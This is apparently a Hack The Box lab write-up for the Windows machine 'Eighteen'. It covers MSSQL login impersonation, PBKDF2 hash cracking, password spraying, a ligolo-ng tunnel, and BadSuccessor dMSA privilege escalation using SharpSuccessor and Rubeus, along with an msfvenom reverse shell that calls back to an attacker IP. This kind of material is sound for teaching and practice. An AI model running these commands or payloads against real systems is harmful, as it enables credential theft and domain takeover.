---
title: "Eighteen"
date: 18-11-2025
categories: [HTB, Windows, Windows Easy, Active]
tags: [Rubeus, Tickets, MSSQL, Password Cracking, BadSuccessor, Password Reuse]
image: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/e9799c53134d081b7510bfe03211ffa9.png
---

Eighteen is an easy Windows machine from Hack The Box. I think the user flag is quite easy, but I required help for the root part. I learned a lot on this box even though it was considered an easy one. An initial scan only shows three ports open, one of which hosts a website where users can register. Since it is an assumed breach box we are given credentials for a user. We can use these credentials to login into the MSSQL instance, we can impersonate another user which allows us to read the hashed password in the database for the admin user. The cracked password is reused by another user on the box which allows us to winrm into it. The box is vulnerable to a recent CVE, BadSuccessor which affects Windows Server 2025, due to our user having the `CREATE_CHILD` attribute in an OU, it allows us to create a dMSA and by migrating it we are able to create a ticker for the Administrator user.

![alt text](/assets/images/eighteen/eighteen.png)

## Nmap

Starting with the an nmap scan reveals three open ports, 80 where a website is being hosted, 1433 for a MSSQL instance which also holds the data for the website and port 5985 for winrm. Interestingly the SMB port is closed which is quite uncommon for a Windows Box.
```
# Nmap 7.95 scan initiated Sat Nov 15 14:00:51 2025 as: /usr/lib/nmap/nmap --privileged -p- --min-rate 5000 -oN eighteen -Pn 10.129.2.163
Nmap scan report for 10.129.2.163
Host is up (0.056s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
1433/tcp open  ms-sql-s
5985/tcp open  wsman

# Nmap done at Sat Nov 15 14:01:17 2025 -- 1 IP address (1 host up) scanned in 26.50 seconds
```

## Enumerating the Database
Since it is an assumed breach box we are given credentials for a user: `kevin : iNa2we6haRj2gaw!`, we can try to see where these credentials are valid using netexec.
```
netexec mssql 10.129.166.174 -u kevin -p 'iNa2we6haRj2gaw!' --local-auth
MSSQL       10.129.166.174  1433   DC01             [*] !!Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)!!
MSSQL       10.129.166.174  1433   DC01             [+] DC01\kevin:iNa2we6haRj2gaw!
```
We can see that the credentials are valid for the MSSQL instance if we use the `--local-auth` flag, this means that kevin is not a user in the AD domain but a local user. One important thing to note from the netexec output is that it gave us the domain name, the machine's hostname and the Windows Server version. We can inspect the MSSQL instance using impacket's `mssqlclient` tool. This tool also provides a very nice interface to enumerate the database with very simple commands.

```
impacket-mssqlclient kevin@DC01
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (kevin  guest@master)> help

    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonated
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    ! {cmd}                    - executes a local shell cmd
    upload {from} {to}         - uploads file {from} to the SQLServer host {to}
    show_query                 - show query
    mask_query                 - mask query

```

I wont show the commands that failed but you can image that enabling the cmdshell will not work, there are also no linked servers so you can skip those. We can enumerate the database which shows a non-default database, `financial_planner`, if we try to use the database as our current user we get an access denied error.
```
SQL (kevin  guest@master)> use financial_planner
ERROR(DC01): Line 1: The server principal "kevin" is not able to access the database "financial_planner" under the current security context.
```

We can enumerate which users we can impersonate with the `enum_impersonate` function:
```
SQL (kevin  guest@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee   grantor   
----------   --------   ---------------   ----------   -------   -------   
b'LOGIN'     b''        IMPERSONATE       GRANT        kevin     !!appdev!!   
```

Nice, kevin can impersonate the appdev user, just from the name alone I think this user will be able to read the `financial_database`. We can login as him and try to enumerate the database.
```
SQL (kevin  guest@master)> exec_as_login appdev
SQL (appdev  appdev@master)> use financial_planner
ENVCHANGE(DATABASE): Old Value: master, New Value: financial_planner
INFO(DC01): Line 1: Changed database context to 'financial_planner'.
SQL (appdev  appdev@financial_planner)> SELECT table_name FROM financial_planner.INFORMATION_SCHEMA.TABLES
table_name    
-----------   
!!users!!         
incomes       
expenses      
allocations   
analytics     
visits        

SQL (appdev  appdev@financial_planner)> SELECT * FROM users
  id   full_name   username   email                password_hash                                                                                            is_admin  
----   ---------   --------   ------------------   ------------------------------------------------------------------------------------------------------   --------   
1002   admin       admin      admin@eighteen.htb   pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133          1  
```

## Cracking the Admin Hash

Nice, inside the database there was a users table which contained the hashed password for the admin user, this hash format is extremely secure, it uses key stretching with 600000 rounds of sha256, normally this hash would be nearly impossible to crack but we are lucky that the admin user chose one of the first passwords in the rockyou wordlist. We cant quite paste this hash into a file and use hashcat, this format requires some manual tweaking. The first step is to identify the different parts of the hash which can split into 5 sections.

1. The first section identifies the key stretching algorithm: `pbkdf2`
2. The second part identifies the hashing algorithm: `sha256`
3. The third section shows how many rounds were used: `600000`
4. This part is the salt of the actual hash, which is divided by dollar signs `$`: `AMtzteQIG7yAbZIa`
5. Finally we get the actual hash value: `0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133`

With each section identified we can do the following changes to create a hash with the right format so that hashcat can crack it using mode `10900 | PBKDF2-HMAC-SHA256 | Generic KDF`.

1. Convert the salt into base64:
```sh
echo -n 'AMtzteQIG7yAbZIa' | base64                                                            
QU10enRlUUlHN3lBYlpJYQ==
```
2. Convert the hash into binary and then into base64:
```sh
echo -n '0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133' | xxd -r -p | base64
BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=
```
3. Construct the hash in the format `sha256:iterations:base64(salt):base64(binary(hash))` the result is:
```sh
cat admin.hash
sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=
```

We can then save the result into a file and attempt to crack it with hashcat.
```
hashcat admin.hash /usr/share/wordlists/rockyou.txt --show                                                                      
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

10900 | PBKDF2-HMAC-SHA256 | Generic KDF

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=:!!iloveyou1!!
```

We can confirm that these credentials are valid by trying them in the web. Turns out the web is kind of useless as I did not find anything that would allow me to get RCE or anything interesting.

![alt text](/assets/images/eighteen/merged.png)

## Password Spraying the Admin's Password
Playing around with netexec I found that I could enumerate users using mssql, this provided me with a list of users and after attempting a password spray I got a hit for the `adam.scott` user.

```
netexec mssql DC01 -u kevin -p 'iNa2we6haRj2gaw!' --local-auth --rid-brute
MSSQL       10.129.166.174  1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)
MSSQL       10.129.166.174  1433   DC01             [+] DC01\kevin:iNa2we6haRj2gaw! 

<SNIP>

MSSQL       10.129.166.174  1433   DC01             1606: EIGHTEEN\jamie.dunn
MSSQL       10.129.166.174  1433   DC01             1607: EIGHTEEN\jane.smith
MSSQL       10.129.166.174  1433   DC01             1608: EIGHTEEN\alice.jones
MSSQL       10.129.166.174  1433   DC01             1609: EIGHTEEN\adam.scott
MSSQL       10.129.166.174  1433   DC01             1610: EIGHTEEN\bob.brown
MSSQL       10.129.166.174  1433   DC01             1611: EIGHTEEN\carol.white
MSSQL       10.129.166.174  1433   DC01             1612: EIGHTEEN\dave.green
```

I saved these usernames to `users.txt` and attempted the password spray with the `iloveyou1` password.
```
netexec winrm DC01 -u users.txt -p 'iloveyou1' 
WINRM       10.129.166.174  5985   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb) 
WINRM       10.129.166.174  5985   DC01             [-] eighteen.htb\jamie.dunn:iloveyou1
WINRM       10.129.166.174  5985   DC01             [-] eighteen.htb\jane.smith:iloveyou1
WINRM       10.129.166.174  5985   DC01             [-] eighteen.htb\alice.jones:iloveyou1
WINRM       10.129.166.174  5985   DC01             !![+] eighteen.htb\adam.scott:iloveyou1 (Pwn3d!)!!
```

We can then login using `evil-winrm` and get the user flag.
```
evil-winrm -i DC01 -u adam.scott -p 'iloveyou1' 

*Evil-WinRM* PS C:\Users\adam.scott\Documents> cat ~\Desktop\user.txt
3a0886be<SNIP>
```
## Pivoting to Forward the DC Ports
I found that not having the SMB port open was quite annoying and it made enumeration harder, therefore, I used `ligolo-ng` to forward these ports to my machine. I first uploaded the `agent.exe` binary into the machine using `evil-winrm` upload function.

I then started the ligolo proxy and created the following interface:
```
sudo ip tuntap add user [YOUR USERNAME] mode tun ligolo
sudo ip link set ligolo up

sudo ./proxy -selfcert
INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
INFO[0000] Listening on 0.0.0.0:11601                   
INFO[0000] Starting Ligolo-ng Web, API URL is set to: http://127.0.0.1:8080 
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: 0.8.2

ligolo-ng » WARN[0000] Ligolo-ng API is experimental, and should be running behind a reverse-proxy if publicly exposed. 
```

We can then run the agent binary on the windows machine to connect back to our proxy.
```
*Evil-WinRM* PS C:\Users\adam.scott\Documents> ./agent.exe -connect 10.10.14.93:11601 -ignore-cert
agent.exe : time="2025-11-18T11:02:36-08:00" level=warning msg="warning, certificate validation disabled"
    + CategoryInfo          : NotSpecified: (time="2025-11-1...ation disabled":String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
time="2025-11-18T11:02:36-08:00" level=info msg="Connection established" addr="10.10.14.93:11601"
```

On the ligolo interface we will see that a new agent has joined and we can select the session and the start it with the following commands:
```
INFO[0149] Agent joined.         id=00505694a500 name="EIGHTEEN\\adam.scott@DC01" remote="10.129.166.174:52251"
ligolo-ng » session
? Specify a session : 1 - EIGHTEEN\adam.scott@DC01 - 10.129.166.174:52251 - 00505694a500
[Agent : EIGHTEEN\adam.scott@DC01] » start
INFO[0154] Starting tunnel to EIGHTEEN\adam.scott@DC01 (00505694a500)
```

The only thing left to do is to add a route to the interface. Following this we can interact with the windows server at the `240.0.0.1` IP address. This is confirmed with the nmap scan.

```
sudo ip route add 240.0.0.1/32 dev ligolo

nmap 240.0.0.1                                                          
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-18 07:02 EST
Nmap scan report for 240.0.0.1
Host is up (0.079s latency).
Not shown: 986 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
1433/tcp open  ms-sql-s
1434/tcp open  ms-sql-m
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman
```

## Discovering the BadSuccessor Exploit
From here I uploaded, winpeas and SharpHound to try to find anything that would allow me to get root. None of these showed anything promising. After being stuck for a while I asked for a nudge (thank you [@gzzcoo](https://gzzcoo.com)). After enumerating the write permissions my user has we can see that `adam.scott` has the `CREATE_CHILD` permission over the Staff OU. Not expecting anything interesting I googled `Create Child Privilege Escalation` and lo and behold a vulnerability targetting 2025 windows servers appeared. 

```
bloodyAD -d eighteen.htb --host 240.0.0.1  -u adam.scott -p iloveyou1 get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=eighteen,DC=htb
permission: WRITE

distinguishedName: OU=Staff,DC=eighteen,DC=htb
!!permission: CREATE_CHILD!!

distinguishedName: CN=adam.scott,OU=Staff,DC=eighteen,DC=htb
permission: WRITE
```

I will not go into the details about how this exploit works but if you want to learn more about it you can check the [author's blog post](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory#escalation) which describes the exploit and also has a POC for it. The requirements to exploit this vulnerability is that our user has to have the `CREATE_CHILD` permission. Since our user has this permission we can attempt to exploit it. There is an already compiled binary which will create a weaponized dMSA object. The source code can be found [here](https://github.com/logangoins/SharpSuccessor) and the compiled binary can be found [here](https://github.com/gzzcoo/SharpSuccessor). We can upload this binary using `evil-winrm` and execute it.

```
*Evil-WinRM* PS C:\Users\adam.scott\Documents> ./SharpSuccessor.exe add /impersonate:Administrator /path:"OU=Staff,DC=eighteen,DC=htb" /account:adam.scott /name:attacker
   _____ _                      _____
  / ____| |                    / ____|
 | (___ | |__   __ _ _ __ _ __| (___  _   _  ___ ___ ___  ___ ___  ___  _ __
  \___ \| '_ \ / _` | '__| '_ \\___ \| | | |/ __/ __/ _ \/ __/ __|/ _ \| '__|
  ____) | | | | (_| | |  | |_) |___) | |_| | (_| (_|  __/\__ \__ \ (_) | |
 |_____/|_| |_|\__,_|_|  | .__/_____/ \__,_|\___\___\___||___/___/\___/|_|
                         | |
                         |_|
@_logangoins

[+] Adding dnshostname attacker.eighteen.htb
[+] Adding samaccountname attacker$
[+] Administrator's DN identified
[+] Attempting to write msDS-ManagedAccountPrecededByLink
[+] Wrote attribute successfully
[+] Attempting to write msDS-DelegatedMSAState attribute
[+] Attempting to set access rights on the dMSA object
[+] Attempting to write msDS-SupportedEncryptionTypes attribute
[+] Attempting to write userAccountControl attribute
[+] Created dMSA object 'CN=attacker' in 'OU=Staff,DC=eighteen,DC=htb'
[+] Successfully weaponized dMSA object
```

We can check that the exploit with netexec, if we enumerate computers we will see our newly created account.
```
netexec ldap 240.0.0.1 -u adam.scott -p iloveyou1 --computers

LDAP        240.0.0.1       389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb) (signing:Enforced) (channel binding:No TLS cert)
LDAP        240.0.0.1       389    DC01             [+] eighteen.htb\adam.scott:iloveyou1 
LDAP        240.0.0.1       389    DC01             [*] Total records returned: 3
LDAP        240.0.0.1       389    DC01             DC01$
LDAP        240.0.0.1       389    DC01             !!attacker$!!
```

The next steps can be a bit tricky. We need to use Rubeus to create tickets to exploit it, specifically, we need the latest Rubeus version. Since Rubeus does not offer pre-compiled binaries I went ahead and compiled the source code myself. I already had Visual Studio 2022 pre installed so I am not sure if you need anything extra to compile it. I used the command line to do it and I used this command:
```
C:\Users\Public\Rubeus>dotnet build Rubeus.sln --configuration Release
```

This generated an executable file which I transfered to my Kali machine and into the DC using `evil-winrm` upload function. The next step is to get the ticket for `adam.scott` which can be done using the following command within `evil-winrm`

```
./Rubeus.exe asktgt /user:adam.scott /password:“iloveyou1” /enctype:aes256 /domain:eighteen.htb /nowrap
 

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3

[*] Action: Ask TGT

[*] Using salt: EIGHTEEN.HTBadam.scott
[*] Using aes256_cts_hmac_sha1 hash: 02F93F7E9E128C32449E2F20475AFCDFB6CC2B4444AC8FD0B02406AF018F75E5
[*] Building AS-REQ (w/ preauth) for: 'eighteen.htb\adam.scott'
[*] Using domain controller: fe80::ccc0:a94:9958:c9de%3:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFpjCCBaKgAwIBBaEDAgEWooIEqTCCBKVhggShMIIEnaADAgEFoQ4bDEVJR0hURUVOLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMZWlnaHRlZW4uaHRio4IEYTCCBF2gAwIBEqEDAgECooIETwSCBEvwQk9pE9eF5ElqKRVInrFN47KtHjKMrOCmt09b/QgX26glnXUKgPu+3qVOtlZMZzBB1mK+ePpEZ/3oVT1xvD75tpiKmmAZOSdkxwdUZ9OMth/5UPAtNQmTT1MYdVMbajkQg+i1Gg5lJa5nZ3190ZJxgUIPHxdBkjVieuZmmWgQWcCgd7kasBjuGrHcrqbgXIkvJz3gA55WNvqmIOissqUlZyBbjXIoWbzqXJGPiCxsNYvc3pQevZkEHItxhW09xWRiKNlw/Dmg7XBODjw+UCcrJXqp1VrU/rWntTTpYCpFTD+KtE3F5WpkhctuXa+E45L4PEsgOjKdb7s6GH3/mdlAvJ98djQ1L3zJHswQQcotlSJQvdlJgzk7v2EgYHm09omg4Yh6QLOGLa8tCC6OuWu7RkasjKdPFbiQrTVoYI2+7BWJUy1ZVP8NL8nUz2L7tGI3cckzseAnmoLN/VYCygOfMRAmv1XX1CGxbpyQzDN/Y3LxLxdn3S4iGlbYU6g15Ci9dlTyPtmpPsldcGBd4kuBscZ4FOtDnRljD23h39YWRb4Es1IrMG1laW5xtb1VB5svihOhkjDqrSVjeXrk+REeKybQe945IQqMi5Lgok4U7hPzmPKtIBxOW7ATaawLnz36NO3WTFmjsKp5zUGeM2oG2X0sEnmUkXcBQFSoy4bNBmBGEhGlQj2usw9maXnsNhUDSFpxVmss5QXWVQ8FkPqI5Z6kawnSGkX1eOizVx1Fty5Iu/KPajuW1xb25qHtpoeEAHXTtSR1fGgRGTghimsDWu/2kK1X9pZCjHcH8FY9x3AVwbm5hlXXqZ4upnlG/X3CKRCSs6AJwJLLuF4JRNfZKfiMOx1sB63UnPTThE8mX2aBtQqykdUTNEBh32r8Vdi7HCn7Q8nJ2sKCRSHW8TGX1+xagDHEkJTrvOA0OTvM7y2FzPQqKaahia7Pq9YgprfbobEu4mXXhX/ApqIWn6M30z2AMLPV5Acy1eu2gRrgTM+4GkElyMEapD8Yy+2qGOUf1W0gcY99zn1qQ41uiR4oZyg8vfTlPUgnAH7D2bPgCBqTyeefQLY9vm0jX8gTPcCdVcajf8vh0+J7b9K9Y7NoiX1olvSYaGmO1gcWkLRwItbQkRYhqZnkKdxP29MPhiKIi+M3ZagzDGddw00CQ4Y5r55aMRyQ9ezV/B9ac80kqtkw0S073kx9VssetzyB8ItHpDsm4S0gFzopaM7Wgq2dtT8uzd4+GTQZPFMCJ7C6oyLBcnXUwJkEl+V1UQ7ULE47mSBgk6dhtprdzmmLBZCsNtmo+lD7LZVjiymbnLBwoe3o+81PEfIBGryjwpvvC5i+ONIdxqioQ4CEZuxIzFLB9ijdanX9oo0c6goCspRsNzhcdk3LKgJoMXYryuyB4jKXoYGRVAd1/5JeRoHRw7X8A81GMOrb2DXZZ7mslToEyNN1UyqYnzEmDemro4HoMIHloAMCAQCigd0Egdp9gdcwgdSggdEwgc4wgcugKzApoAMCARKhIgQghQHNFeQMxlaQ2wC9rYbD12rCppA90pX9TqocoCHrvuShDhsMRUlHSFRFRU4uSFRCohcwFaADAgEBoQ4wDBsKYWRhbS5zY290dKMHAwUAQOEAAKURGA8yMDI1MTExODE5MjcxNFqmERgPMjAyNTExMTkwNTI3MTRapxEYDzIwMjUxMTI1MTkyNzE0WqgOGwxFSUdIVEVFTi5IVEKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDGVpZ2h0ZWVuLmh0Yg==

  ServiceName              :  krbtgt/eighteen.htb
  ServiceRealm             :  EIGHTEEN.HTB
  UserName                 :  adam.scott (NT_PRINCIPAL)
  UserRealm                :  EIGHTEEN.HTB
  StartTime                :  11/18/2025 11:27:14 AM
  EndTime                  :  11/18/2025 9:27:14 PM
  RenewTill                :  11/25/2025 11:27:14 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  hQHNFeQMxlaQ2wC9rYbD12rCppA90pX9TqocoCHrvuQ=
  ASREP (key)              :  02F93F7E9E128C32449E2F20475AFCDFB6CC2B4444AC8FD0B02406AF018F75E5
```

Since we are dealing with PtT, `evil-winrm` is not appropiate, we must first create a session with logonType 9, which is free of tickets. To do this I simply created a `msfvenom` windows reverse shell which I later caught using `netcat`. To execute the reverse shell I used rubeus to create a process that contains no tickets.
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.93 LPORT=4444 -f exe > shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7680 bytes
```

```
*Evil-WinRM* PS C:\Users\adam.scott\Documents> ./Rubeus.exe createnetonly /program:shell.exe /show

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3


[*] Action: Create Process (/netonly)


[*] Using random username and password.

[*] Showing process : True
[*] Username        : PP6974CE
[*] Domain          : 5K050ZT1
[*] Password        : WM4KZZ1R
[+] Process         : 'shell.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 4176
[+] LUID            : 0x7323cc
```

```
nc -lvnp 4444                                                
listening on [any] 4444 ...
connect to [10.10.14.93] from (UNKNOWN) [10.129.166.174] 57188
Microsoft Windows [Version 10.0.26100.4349]
(c) Microsoft Corporation. All rights reserved.

C:\Users\adam.scott\Documents>
```

Within this sesison we can then continue using Rubeus to forge tickets that will give us administrator-level access. Our next step is to use the ticket of `adam.scott` to impersonate the dMSA account:

```
./Rubeus.exe asktgs /targetuser:attacker$ /service:krbtgt/eighteen.htb /opsec /dmsa /nowrap /ptt /ticket:<ADAM.SCOTT TICKET>

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3 

[*] Action: Ask TGS

[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building DMSA TGS-REQ request for 'attacker$' from 'adam.scott'
[+] Sequence number is: 28457708
[*] Using domain controller: DC01.eighteen.htb (fe80::e2fd:bceb:db8f:3b51%3)
[+] TGS request successful!
[+] Ticket successfully imported!
[*] base64(ticket.kirbi):

      doIFzDCCBcigAwIBBaEDAgEWooIE0DCCBMxhggTIMIIExKADAgEFoQ4bDEVJR0hURUVOLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMRUlHSFRFRU4uSFRCo4IEiDCCBISgAwIBEqEDAgECooIEdgSCBHKLJnsFLJ2Gk2pBmal08chwWsdCDkly5l/ZjJISIYv6rvmU5cCaCyXVpvMhLz2kavnWXed39FCgf7jHeEjsBP2sTczKOub44HDyf58GjUKqNvEoc3jIMT29+rjyYWU4Y44cBT8ciGU7NuUkXcUjwruwIvx8/7PCns2DDEhk5d5imXMaHx47GRCX2SMFkjWA+22jTrMPH/AcFPtyb3pNSI5haczL5lq2iGqPxkDb+W89gxj9Ot41Gq9dvHqrI66WwVr9r0j9doqomzxYBNUjMEk8khNXS0d/+p6ugxdoH/u6jxaASBTVKqVzDLWpzrkcfhnioQ7ODWeP325cAgyTRzzlJ5oDGI6HdOH0GHlVl0Z8OxblsPDPDLDRYsLp0CvdM0aq6J1Lmw89ogIUULaIh9NtGHgEEG+dDzu/XfeSIThO3xPr1x2LtMSoPRcKHIc+kTPs7OZCXiTa7Q4tQzilN/iQMrDHrUGmrrSyACrMKbci+868Li4XmfZuD7qSctD9LZepHyXi3rquRL6TWAyxgPX4qzpNlPRfLhnIgZUaTGvgFIHGGgLKDFpICtY0lLFfzM1zwCCWG9D3xtDnGNtsSKerIINekUDMp4TUxUcm3T+A0tuGzN6scDk5v4TCk6chELB/dLkDEYc/wDwxDk7sD/5gMGWEdnya6wpErdYg9pXJVLDTNHY3a6u7wuVyW1667zC9m6mJVv5IPZ6jtkiaNiU/sJXpyMwPKqDT7AGsjauKrjXMH4XZJzQ/fkGSWw1GF+uNyruaJFBxKVwMMJAAj7Vp1SLEVhaD0EPp35yvgl4K23o+96kh6yIJohHhaoM7uWIte1sNDoN5zkMUh5KCEZU+lhLVjRdvSGfcOgvp7OEo30HD09DJLBGfNKhwwPfBlXxRzdY7QLn+pu304TUzhrl9k3GYZQty/rFn/V/4AphZXRkHXionIU1bbMe5BUm2UWkXUj+kdLJ3j4zo626GzRdsFEFvTZeObjpxD2P8tyUcxO7BkxS2W+PFe2BWajNvkCsmBikvCSjjbId9umnF/mw94mH2ggXUYAWl6MHXCv2J7P9gQSB52wYaBhMcecw+0Z5ZabaqFl7xgbuDSHaMW8X8HrkzVQQ5bq8/mNOEwso34JI/fhJ7fiWbGdq4bo8wqyj4RxhYcQpb7eYgRr6wobbAaUn59yeVt7/0ElFhWrrCY9Az6pAvTo5yzhuAu+Hz0n5QJruQZO1t6HW3XFEx8eLBtGn1Uu947+VKTZ90oS5fNA32u/l3Hzq/bU6ZKLNBFWmC36n/mtCKXJF2dholkEwKAS1jfshmBRyO0hkkOYCZBfJfvDug1Tnzs2MCRmdyAKdyViSOGurOKuSu743aU+Et+Qi8ik/Q0I+qtf/DAJpW9kljwGNUC4rcGuJ8kjaZbOa2v5Vil/7vk9raYfQYL4KJdBzYiUli6lTXiQpqkyDzsBbVk0K9PZFhZB4wa9n89oPkQuTdaYb26o30DGrBWiBdR+ij0e8VpBnTFUWGiYF1SCnOo4HnMIHkoAMCAQCigdwEgdl9gdYwgdOggdAwgc0wgcqgKzApoAMCARKhIgQgEEdr+v3aTvKZDdN6LCGGbW+vpqhQrqe5lSI0+U/IJu2hDhsMZWlnaHRlZW4uaHRiohYwFKADAgEBoQ0wCxsJYXR0YWNrZXIkowcDBQBAoQAApREYDzIwMjUxMTE4MjE1MzIzWqYRGA8yMDI1MTExODIyMDgyM1qnERgPMjAyNTExMjUyMTUyNTRaqA4bDEVJR0hURUVOLkhUQqkhMB+gAwIBAqEYMBYbBmtyYnRndBsMRUlHSFRFRU4uSFRC

  ServiceName              :  krbtgt/EIGHTEEN.HTB
  ServiceRealm             :  EIGHTEEN.HTB
  UserName                 :  attacker$ (NT_PRINCIPAL)
  UserRealm                :  eighteen.htb
  StartTime                :  11/18/2025 1:53:23 PM
  EndTime                  :  11/18/2025 2:08:23 PM
  RenewTill                :  11/25/2025 1:52:54 PM
  Flags                    :  name_canonicalize, pre_authent, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  EEdr+v3aTvKZDdN6LCGGbW+vpqhQrqe5lSI0+U/IJu0=
  Current Keys for attacker$: (aes256_cts_hmac_sha1) 7400CAA28811D5298952D1167CC9CF51D0EAFC48DA47B25EF653D1C181FE5FE2
``` 

Now you can request a service ticket with Administrator context for any SPN, including the Domain Controllers for post-exploitation. For example here I will show admin privileges for SMB on the domain controller:

```
./Rubeus.exe asktgs /user:attacker$ /service:cifs/DC01.eighteen.htb /opsec /dmsa /nowrap /ptt /ticket:<dMSA TICKET>

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3 

[*] Action: Ask TGS

[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building DMSA TGS-REQ request for '' from 'attacker$'
[+] Sequence number is: 2134522973
[*] Using domain controller: DC01.eighteen.htb (fe80::e2fd:bceb:db8f:3b51%3)
[+] TGS request successful!
[*] '/opsec' passed and service ticket has the 'ok-as-delegate' flag set, requesting a delegated TGT.
[+] Sequence number is: 406195363
[+] Ticket successfully imported!
[*] base64(ticket.kirbi):

